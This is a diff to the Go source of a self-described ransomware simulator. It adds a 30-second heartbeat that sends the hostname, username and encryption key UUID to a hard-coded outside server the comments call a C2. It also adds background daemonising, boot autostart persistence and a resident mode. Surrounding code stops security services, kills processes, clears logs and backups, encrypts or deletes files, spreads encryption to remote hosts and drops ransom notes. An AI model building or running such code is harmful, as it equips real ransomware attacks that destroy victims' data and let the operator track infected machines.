@@ -20,10 +20,12 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
+	"os/signal"
 	"path/filepath"
 	"regexp"
 	"runtime"
 	"sort"
+	"strconv"
 	"strings"
 	"sync"
 	"sync/atomic"
@@ -33,10 +35,21 @@ import (
 )
 
 const (
-	version   = "v3.7"
-	apiURL    = "https://encrypt.yangzifun.org/E56dSY"
-	beaconURL = "https://encrypt.yangzifun.org/beacon_check_in"
+	version = "v3.8"
 
+	// 终端心跳：每 30 秒上报一次，管理后台超过 90 秒未收到即判定离线
+	heartbeatInterval = 30 * time.Second
+)
+
+// apiURL 密钥获取地址；heartbeatURL 心跳上报地址。
+// 以变量形式声明，便于单元测试指向本地服务或不可达地址。
+var (
+	apiURL         = "https://encrypt.yangzifun.org/E56dSY"
+	heartbeatURL   = "https://encrypt.yangzifun.org/api/heartbeat"
+	heartbeatToken = ""
+)
+
+const (
 	largeFileThreshold = 1 * 1024 * 1024 * 1024
 	chunkSize          = 1 * 1024 * 1024
 	headChunks         = 1
@@ -254,6 +267,15 @@ type options struct {
 	noClearLogs     bool
 	aggressiveDelay int
 
+	// 后台驻留与密钥保留
+	resident bool
+	keepKey  bool
+
+	// 定时任务后台化
+	foreground  bool
+	noAutostart bool
+	daemonChild bool
+
 	// 定时触发
 	delay            time.Duration
 	atTime           string
@@ -338,7 +360,10 @@ func main() {
 
 	// 计划任务唤起后的运行在结束时自动清理任务
 	if wasScheduledRun() && opt.scheduleCleanup {
-		defer cleanupPersistentSchedule(opt.scheduleTaskName)
+		defer func() {
+			cleanupPersistentSchedule(opt.scheduleTaskName)
+			markScheduleDone(opt)
+		}()
 	}
 
 	// ---------- 阶段 0: 定时触发（--delay / --at / --random-delay / --persist-schedule）----------
@@ -360,11 +385,55 @@ func main() {
 				return
 			}
 		}
+
+		// 已完成的定时任务子进程：清理开机自启后直接退出，避免重启后重复执行
+		if isDaemonChild() && isScheduleDone(opt) {
+			fmt.Println("[*] 检测到该定时任务已完成，子进程退出。")
+			removeAutoStart(opt.scheduleTaskName)
+			return
+		}
+
+		// 显式定时（--delay / --at）：默认转入后台运行并注册开机自启
+		explicitSchedule := opt.delay > 0 || strings.TrimSpace(opt.atTime) != ""
+		if needWait && explicitSchedule && !opt.foreground && !isDaemonChild() {
+			clearScheduleDone(opt)
+			autoRegistered := false
+			if !opt.noAutostart {
+				if regErr := registerAutoStart(opt, startAt); regErr != nil {
+					fmt.Printf("[!] 注册开机自启失败（重启后需手动启动）: %v\n", regErr)
+				} else {
+					autoRegistered = true
+				}
+			}
+			logPath := scheduleLogPath()
+			pid, spawnErr := spawnDaemon(buildDaemonArgs(startAt), logPath)
+			if spawnErr == nil {
+				fmt.Println()
+				fmt.Printf("[+] 定时任务已转入后台运行: PID %d\n", pid)
+				fmt.Printf("[*] 计划启动时间: %s\n", startAt.Format("2006-01-02 15:04:05"))
+				if autoRegistered {
+					fmt.Println("[+] 已注册开机自启，重启后定时任务仍然有效")
+				}
+				fmt.Printf("[*] 后台日志: %s\n", logPath)
+				fmt.Println("[*] 当前终端可安全关闭；如需前台等待请加 --foreground")
+				return
+			}
+			fmt.Printf("[!] 转入后台失败，回退前台等待: %v\n", spawnErr)
+		}
+
 		if needWait {
 			if !waitUntilStart(startAt, opt) {
 				return
 			}
 		}
+	}
+
+	// 后台子进程运行结束后清理任务与开机自启
+	if isDaemonChild() && opt.scheduleCleanup {
+		defer func() {
+			cleanupPersistentSchedule(opt.scheduleTaskName)
+			markScheduleDone(opt)
+		}()
 	}
 
 	if opt.scanOnly {
@@ -395,13 +464,22 @@ func main() {
 		return
 	}
 	fmt.Println("\n[阶段 2: 防御规避与发现]")
+
+	// 终端心跳：启动后立即上报，之后每 30 秒一次，供管理后台统计在线终端
+	hbMode := "attack"
+	if opt.dryRun {
+		hbMode = "dry-run"
+	} else if remoteOnly {
+		hbMode = "remote"
+	}
+	startHeartbeat(hbMode)
+	defer stopHeartbeat()
+
 	if opt.dryRun {
 		fmt.Println("[*] [演习模式] 跳过所有破坏性操作。")
 	} else if remoteOnly {
 		fmt.Println("[*] [远程编排模式] 跳过本地破坏性操作，仅执行远程横向加密。")
-		go networkBeacon()
 	} else {
-		go networkBeacon()
 
 		if !noStopServices {
 			fmt.Println("\n[+] 停止数据库和安全服务...")
@@ -482,6 +560,7 @@ func main() {
 			fmt.Println("[!] 未找到任何有价值的目标文件。")
 			if !opt.remoteRequested() {
 				fmt.Println("[!] 任务中止。")
+				stopHeartbeat()
 				os.Exit(0)
 			}
 		} else {
@@ -491,7 +570,7 @@ func main() {
 
 	var stats counters
 	var finalUUID = "本地密钥模式"
-	var publicKeyValue, publicKeyFilePath string
+	var publicKeyValue, publicKeyFilePath, keyCachePath string
 
 	// 统一获取密钥：本地加密（非演习）与远程编排共用同一密钥，避免生成两份 UUID
 	if !opt.dryRun || opt.remoteRequested() {
@@ -502,11 +581,22 @@ func main() {
 			if !opt.dryRun {
 				// 保留窗口并给出可操作提示，避免双击运行时窗口一闪而过
 				countdown("此终端将在", 15)
+				stopHeartbeat()
 				os.Exit(1)
 			}
 		} else {
 			finalUUID = uuid
 			publicKeyValue = pem
+			setHeartbeatKey(uuid)
+			rememberKey(uuid, pem)
+			if opt.keepKey {
+				if path, cerr := persistKeyCache(uuid, pem, hbMode, opt.removeOriginal); cerr != nil {
+					fmt.Printf("[!] 密钥缓存写入失败: %v\n", cerr)
+				} else {
+					keyCachePath = path
+					fmt.Printf("[+] 密钥已保存在内存与本地缓存（不会被清理）: %s\n", path)
+				}
+			}
 			fmt.Printf("[*] 当前密钥来源: %s\n", source)
 			if p, perr := ensureLocalPublicKeyFile(uuid, pem); perr != nil {
 				fmt.Printf("[!] %v\n", perr)
@@ -585,7 +675,11 @@ func main() {
 		fmt.Println("====================================================")
 	}
 
-	countdown("此终端将在", 10)
+	if opt.resident {
+		runResidentLoop(finalUUID, keyCachePath)
+	} else {
+		countdown("此终端将在", 10)
+	}
 }
 
 // 初始化程序所在目录
@@ -1123,18 +1217,64 @@ func killLockingProcesses() {
 	}
 }
 
+func defaultLockPath() string {
+	return filepath.Join(os.TempDir(), "ransom_simulator_instance.lock")
+}
+
+// forceReleaseLock 仅清理“持有者已不存在”的陈旧锁，避免误删正在运行的实例锁
 func forceReleaseLock() {
-	lockPath := filepath.Join(os.TempDir(), "ransom_simulator_instance.lock")
-	_ = os.Remove(lockPath)
+	path := defaultLockPath()
+	data, err := os.ReadFile(path)
+	if err != nil {
+		return
+	}
+	pid, _ := strconv.Atoi(strings.TrimSpace(string(data)))
+	if pid <= 0 || !processAlive(pid) {
+		_ = os.Remove(path)
+	}
 }
 
 func createSingleInstanceLock() bool {
-	lockFilePath = filepath.Join(os.TempDir(), "ransom_simulator_instance.lock")
-	file, err := os.OpenFile(lockFilePath, os.O_CREATE|os.O_EXCL, 0666)
-	if err != nil {
+	lockFilePath = defaultLockPath()
+	attempts := 1
+	if isDaemonChild() {
+		// 等父进程退出释放锁（最多约 15 秒）；父进程异常退出时可通过 PID 检测接管
+		attempts = 150
+	}
+	for i := 0; i < attempts; i++ {
+		if tryAcquireLockFile() {
+			return true
+		}
+		if i < attempts-1 {
+			time.Sleep(100 * time.Millisecond)
+		}
+	}
+	return false
+}
+
+func tryAcquireLockFile() bool {
+	f, err := os.OpenFile(lockFilePath, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0666)
+	if err == nil {
+		_, _ = f.WriteString(strconv.Itoa(os.Getpid()) + "\n")
+		_ = f.Close()
+		return true
+	}
+	data, readErr := os.ReadFile(lockFilePath)
+	if readErr != nil {
 		return false
 	}
-	_ = file.Close()
+	pid, _ := strconv.Atoi(strings.TrimSpace(string(data)))
+	if pid > 0 && processAlive(pid) {
+		return false
+	}
+	// 持有者已退出：接管锁
+	_ = os.Remove(lockFilePath)
+	f2, err2 := os.OpenFile(lockFilePath, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0666)
+	if err2 != nil {
+		return false
+	}
+	_, _ = f2.WriteString(strconv.Itoa(os.Getpid()) + "\n")
+	_ = f2.Close()
 	return true
 }
 
@@ -1158,6 +1298,16 @@ func setupFlags(fs *flag.FlagSet) *options {
 	fs.BoolVar(&opt.noKillProcs, "no-kill-procs", false, "跳过终止进程操作")
 	fs.BoolVar(&opt.noClearLogs, "no-clear-logs", false, "跳过清除日志操作")
 	fs.IntVar(&opt.aggressiveDelay, "aggressive-delay", 0, "操作间随机延迟上限（毫秒），0=无延迟")
+
+	// ---- 后台驻留与密钥保留 ----
+	fs.BoolVar(&opt.resident, "resident", false, "加密完成后驻留后台（保持心跳与单实例锁，Ctrl+C 退出）")
+	fs.BoolVar(&opt.keepKey, "keep-key", false, "把密钥（UUID + 公钥）保存在内存与本地缓存中，任务结束后不删除")
+	fs.StringVar(&heartbeatToken, "heartbeat-token", os.Getenv("RANSOM_HEARTBEAT_TOKEN"), "心跳接收密钥（服务端启用后需填写，随心跳以 X-Heartbeat-Token 发送）")
+
+	// ---- 定时任务后台化 ----
+	fs.BoolVar(&opt.foreground, "foreground", false, "定时任务保持前台等待（默认自动转入后台）")
+	fs.BoolVar(&opt.noAutostart, "no-autostart", false, "不注册开机自启（重启后需手动启动）")
+	fs.BoolVar(&opt.daemonChild, "daemon-child", false, "内部参数：后台子进程标记，请勿手动使用")
 
 	// ---- 定时触发 ----
 	fs.DurationVar(&opt.delay, "delay", 0, "启动前等待时长（如 30s/5m/2h），0=不等待")
@@ -1208,9 +1358,15 @@ func setupFlags(fs *flag.FlagSet) *options {
 		_, _ = fmt.Fprintf(os.Stderr, "  - --no-stop-services:   跳过停止数据库和安全服务\n")
 		_, _ = fmt.Fprintf(os.Stderr, "  - --no-kill-procs:      跳过终止占用文件的进程\n")
 		_, _ = fmt.Fprintf(os.Stderr, "  - --no-clear-logs:      跳过清除备份和日志文件\n")
+		_, _ = fmt.Fprintf(os.Stderr, "后台驻留与密钥保留:\n")
+		_, _ = fmt.Fprintf(os.Stderr, "  - --resident:           加密完成后驻留后台（保持心跳，Ctrl+C 退出）\n")
+		_, _ = fmt.Fprintf(os.Stderr, "  - --keep-key:           密钥保存在内存与本地缓存，任务结束后不删除\n")
+		_, _ = fmt.Fprintf(os.Stderr, "  - --heartbeat-token:    心跳接收密钥（服务端启用后必填）\n")
 		_, _ = fmt.Fprintf(os.Stderr, "  - --aggressive-delay:   操作间随机延迟上限（毫秒）\n")
 		_, _ = fmt.Fprintf(os.Stderr, "定时触发:\n")
-		_, _ = fmt.Fprintf(os.Stderr, "  - --delay / --at / --random-delay: 定时启动\n")
+		_, _ = fmt.Fprintf(os.Stderr, "  - --delay / --at / --random-delay: 定时启动（默认自动转入后台）\n")
+		_, _ = fmt.Fprintf(os.Stderr, "  - --foreground:         定时任务保持前台等待（不自动后台化）\n")
+		_, _ = fmt.Fprintf(os.Stderr, "  - --no-autostart:       不注册开机自启（重启后需手动启动）\n")
 		_, _ = fmt.Fprintf(os.Stderr, "  - --persist-schedule:   注册系统计划任务（schtasks），退出后到点唤起\n")
 		_, _ = fmt.Fprintf(os.Stderr, "模拟攻击扫描:\n")
 		_, _ = fmt.Fprintf(os.Stderr, "  - --scan / --scan-only: 攻击面侦察（端口发现 + 本机资产 + 报告）\n")
@@ -1246,21 +1402,116 @@ func countdown(message string, seconds int) {
 	fmt.Println("\r程序已退出。                                  ")
 }
 
-func networkBeacon() {
-	time.Sleep(3 * time.Second)
-	client := http.Client{Timeout: 5 * time.Second}
-	resp, err := client.Get(beaconURL)
+// ---------------------------------------------------------------------------
+// 终端心跳：每 30 秒向 C2 上报一次，供管理后台统计在线终端
+// ---------------------------------------------------------------------------
+
+var heartbeatState struct {
+	mu      sync.RWMutex
+	keyUUID string
+	mode    string
+	started atomic.Bool
+	startAt time.Time
+}
+
+// setHeartbeatKey 记录本次运行使用的加密密钥 UUID（获取密钥后调用）
+func setHeartbeatKey(uuid string) {
+	heartbeatState.mu.Lock()
+	heartbeatState.keyUUID = uuid
+	heartbeatState.mu.Unlock()
+}
+
+// terminalID 生成稳定的终端标识（主机名 + 系统 + 架构 + 用户名 的指纹）
+func terminalID() string {
+	host, _ := os.Hostname()
+	user := os.Getenv("USERNAME")
+	if user == "" {
+		user = os.Getenv("USER")
+	}
+	sum := sha256.Sum256([]byte(host + "|" + runtime.GOOS + "|" + runtime.GOARCH + "|" + user))
+	sum[6] = (sum[6] & 0x0f) | 0x40
+	sum[8] = (sum[8] & 0x3f) | 0x80
+	return fmt.Sprintf("%x-%x-%x-%x-%x", sum[0:4], sum[4:6], sum[6:8], sum[8:10], sum[10:16])
+}
+
+// startHeartbeat 启动心跳协程：启动后 2 秒立即上报一次，之后每 30 秒上报一次
+func startHeartbeat(mode string) {
+	heartbeatState.mu.Lock()
+	heartbeatState.mode = mode
+	heartbeatState.mu.Unlock()
+	heartbeatState.startAt = time.Now()
+	heartbeatState.started.Store(true)
+
+	go func() {
+		time.Sleep(2 * time.Second)
+		sendHeartbeat("start")
+		ticker := time.NewTicker(heartbeatInterval)
+		defer ticker.Stop()
+		for range ticker.C {
+			sendHeartbeat("ping")
+		}
+	}()
+}
+
+// stopHeartbeat 正常退出时上报一次 stop，让管理后台立即标记离线
+func stopHeartbeat() {
+	if !heartbeatState.started.Load() {
+		return
+	}
+	heartbeatState.started.Store(false)
+	sendHeartbeat("stop")
+}
+
+func sendHeartbeat(event string) {
+	host, _ := os.Hostname()
+	user := os.Getenv("USERNAME")
+	if user == "" {
+		user = os.Getenv("USER")
+	}
+
+	heartbeatState.mu.RLock()
+	mode := heartbeatState.mode
+	keyUUID := heartbeatState.keyUUID
+	heartbeatState.mu.RUnlock()
+
+	payload := map[string]interface{}{
+		"id":       terminalID(),
+		"hostname": host,
+		"username": user,
+		"os":       runtime.GOOS,
+		"arch":     runtime.GOARCH,
+		"version":  version,
+		"mode":     mode,
+		"key_uuid": keyUUID,
+		"pid":      os.Getpid(),
+		"uptime_s": int64(time.Since(heartbeatState.startAt).Seconds()),
+		"event":    event,
+	}
+	body, err := json.Marshal(payload)
+	if err != nil {
+		return
+	}
+
+	client := &http.Client{Timeout: 5 * time.Second}
+	req, err := http.NewRequest("POST", heartbeatURL, bytes.NewReader(body))
+	if err != nil {
+		return
+	}
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("User-Agent", "Ransom-Simulator/"+version+" ("+runtime.GOOS+"/"+runtime.GOARCH+")")
+	if heartbeatToken != "" {
+		req.Header.Set("X-Heartbeat-Token", heartbeatToken)
+	}
+
+	resp, err := client.Do(req)
 	if err != nil {
 		if logEnabled {
-			logOperation(fmt.Sprintf("Beacon check-in 失败: %v", err))
+			logOperation(fmt.Sprintf("心跳上报失败: %v", err))
 		}
 		return
 	}
 	defer func() { _ = resp.Body.Close() }()
-
-	if logEnabled {
-		logOperation(fmt.Sprintf("Beacon check-in 完成, 状态码: %d", resp.StatusCode))
-	}
+	_, _ = io.Copy(io.Discard, resp.Body)
 }
 
 func simulateDestructiveActions() {
@@ -1482,13 +1733,13 @@ func scanFiles(extFilter map[string]bool, scanRoots []string, encryptAllFormats 
 				}
 				return nil
 			}
+			fileName := filepath.Base(path)
+			if isProtectedArtifact(fileName) {
+				return nil
+			}
 			shouldProcess := false
 			if encryptAllFormats {
 				shouldProcess = true
-				fileName := filepath.Base(path)
-				if fileName == ransomNoteFileName || fileName == ransomWallpaperFileName || strings.HasSuffix(fileName, ".lock") || strings.EqualFold(filepath.Ext(fileName), ".encrypted") {
-					shouldProcess = false
-				}
 			} else {
 				shouldProcess = shouldEncrypt(path, extFilter)
 			}
@@ -1541,6 +1792,161 @@ func validatePublicKey(pemText string) error {
 		return fmt.Errorf("公钥格式错误: %w", err)
 	}
 	return nil
+}
+
+// ---------------------------------------------------------------------------
+// 密钥驻留：内存保存 + 本地缓存（--keep-key）
+// ---------------------------------------------------------------------------
+
+type keyCacheRecord struct {
+	UUID           string `json:"uuid"`
+	PublicKeyPEM   string `json:"public_key_pem"`
+	CreatedAt      string `json:"created_at"`
+	Mode           string `json:"mode"`
+	RemoveOriginal bool   `json:"remove_original"`
+	Version        string `json:"version"`
+}
+
+var (
+	keyMemoryMu   sync.RWMutex
+	keyMemoryUUID string
+	keyMemoryPEM  string
+)
+
+// rememberKey 把本次运行使用的密钥保存在进程内存中（驻留期间不会释放）
+func rememberKey(uuid, pemText string) {
+	keyMemoryMu.Lock()
+	keyMemoryUUID = uuid
+	keyMemoryPEM = pemText
+	keyMemoryMu.Unlock()
+}
+
+// memoryKey 读取内存中保存的密钥（供驻留状态输出使用）
+func memoryKey() (uuid, pemText string) {
+	keyMemoryMu.RLock()
+	defer keyMemoryMu.RUnlock()
+	return keyMemoryUUID, keyMemoryPEM
+}
+
+// persistKeyCache 把 UUID 与公钥写入本地缓存：程序目录 + 用户级缓存目录。
+// 缓存文件会被扫描流程跳过，不会因加密或 -remove 被删除。
+func persistKeyCache(uuid, pemText, mode string, removeOriginal bool) (string, error) {
+	if strings.TrimSpace(uuid) == "" || strings.TrimSpace(pemText) == "" {
+		return "", fmt.Errorf("UUID 或公钥内容为空，无法写入密钥缓存")
+	}
+
+	record := keyCacheRecord{
+		UUID:           uuid,
+		PublicKeyPEM:   pemText,
+		CreatedAt:      time.Now().Format(time.RFC3339),
+		Mode:           mode,
+		RemoveOriginal: removeOriginal,
+		Version:        version,
+	}
+	data, err := json.MarshalIndent(record, "", "  ")
+	if err != nil {
+		return "", fmt.Errorf("序列化密钥缓存失败: %w", err)
+	}
+	data = append(data, '\n')
+
+	fileName := fmt.Sprintf("key_cache_%s.json", uuid)
+	paths := []string{filepath.Join(programDir, fileName)}
+	if cacheDir := keyCacheDir(); cacheDir != "" {
+		if mkErr := os.MkdirAll(cacheDir, 0700); mkErr == nil {
+			paths = append(paths, filepath.Join(cacheDir, fileName))
+		}
+	}
+
+	var written []string
+	var firstErr error
+	for _, path := range paths {
+		if wErr := os.WriteFile(path, data, 0600); wErr != nil {
+			if firstErr == nil {
+				firstErr = wErr
+			}
+			continue
+		}
+		written = append(written, path)
+	}
+	if len(written) == 0 {
+		if firstErr == nil {
+			firstErr = fmt.Errorf("没有可写的缓存目录")
+		}
+		return "", fmt.Errorf("写入密钥缓存失败: %w", firstErr)
+	}
+	return written[0], nil
+}
+
+// isProtectedArtifact 判断文件名是否为程序自身产物：不参与扫描、加密与删除。
+func isProtectedArtifact(name string) bool {
+	lower := strings.ToLower(name)
+	switch lower {
+	case strings.ToLower(ransomNoteFileName),
+		strings.ToLower(ransomWallpaperFileName),
+		"ransom_log.txt",
+		"success_encrypted.log",
+		"failed_encrypted.log",
+		"operations.log":
+		return true
+	}
+	if strings.HasSuffix(lower, ".lock") || strings.HasSuffix(lower, ".encrypted") {
+		return true
+	}
+	if strings.HasPrefix(lower, "public_key") && strings.HasSuffix(lower, ".pem") {
+		return true
+	}
+	if strings.HasPrefix(lower, "key_cache_") && strings.HasSuffix(lower, ".json") {
+		return true
+	}
+	if strings.HasPrefix(lower, "recon_report_") || strings.HasPrefix(lower, "remote_report_") {
+		return true
+	}
+	return false
+}
+
+// ---------------------------------------------------------------------------
+// 后台驻留模式（--resident）
+// ---------------------------------------------------------------------------
+
+// runResidentLoop 加密完成后驻留后台：保持心跳与单实例锁，直到收到退出信号。
+func runResidentLoop(keyUUID, keyCachePath string) {
+	uuid, _ := memoryKey()
+	if uuid == "" {
+		uuid = keyUUID
+	}
+
+	fmt.Println()
+	fmt.Println("================== [ 后台驻留模式 ] ==================")
+	fmt.Printf("  - 进程 PID:        %d\n", os.Getpid())
+	if uuid != "" {
+		fmt.Printf("  - 密钥 UUID:       %s（内存中保留）\n", uuid)
+	}
+	if keyCachePath != "" {
+		fmt.Printf("  - 密钥缓存:        %s（不会删除）\n", keyCachePath)
+	}
+	fmt.Println("  - 心跳上报:        每 30 秒（管理后台持续显示在线）")
+	fmt.Println("  - 退出方式:        Ctrl+C 或结束进程")
+	fmt.Println("======================================================")
+
+	sigCh := make(chan os.Signal, 1)
+	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
+	defer signal.Stop(sigCh)
+
+	statusTicker := time.NewTicker(5 * time.Minute)
+	defer statusTicker.Stop()
+
+	for {
+		select {
+		case sig := <-sigCh:
+			fmt.Printf("\n[*] 收到退出信号 (%v)，结束驻留。\n", sig)
+			return
+		case <-statusTicker.C:
+			if logEnabled {
+				logOperation(fmt.Sprintf("后台驻留中: pid=%d uuid=%s 运行时长=%s",
+					os.Getpid(), uuid, time.Since(heartbeatState.startAt).Round(time.Second)))
+			}
+		}
+	}
 }
 
 func runEncryptionWorkers(files []string, numWorkers int, stats *counters, uuid, publicKeyValue string, removeOriginal bool) {
